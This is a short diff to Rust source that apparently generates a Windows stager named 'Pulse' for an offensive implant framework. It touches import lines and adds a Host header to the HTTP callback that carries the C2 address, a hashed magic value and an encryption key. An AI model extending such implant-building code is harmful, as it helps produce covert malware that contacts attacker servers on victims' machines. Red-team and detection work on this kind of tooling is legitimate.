@@ -1,6 +1,5 @@
-use crate::{GenerateArch, PulseConfig, Version};
-
-use super::{djb2_hash, utils::{TARGET_SOURCE_PATH, X64_MAIN_TEMPLATE_PATH, X64_MAKE_BODY, X86_MAIN_TEMPLATE_PATH, X86_MAKE_BODY, generate_string_asm_instructions, generate_dll_name_asm}, PANIC};
+use crate::config::{GenerateArch, PulseConfig, Version};
+use super::{djb2_hash, utils::{generate_dll_name_asm, generate_string_asm_instructions, TARGET_SOURCE_PATH, X64_MAIN_TEMPLATE_PATH, X64_MAKE_BODY, X86_MAIN_TEMPLATE_PATH, X86_MAKE_BODY}, PANIC};
 
 static X64_DEPENDENCIES: &str = "
 use malefic_win_kit::asm::arch::x64::{
@@ -182,7 +181,10 @@ fn make_source_code(
     }
     let (ip, port) = url.split_at(url.find(":").unwrap());
     let mut http_header = config.http.build(10);
-    http_header.push_str("\r\n");
+    if config.http.headers.get("Host").map_or(true, |v| v.is_empty()) {
+        http_header.push_str(&format!("Host: {}\\r\\n", url));
+    }
+    http_header.push_str("\\r\\n");
     let magic = djb2_hash(&config.flags.magic);
     let key = &config.key;
     let iv = key.chars().rev().collect::<String>();
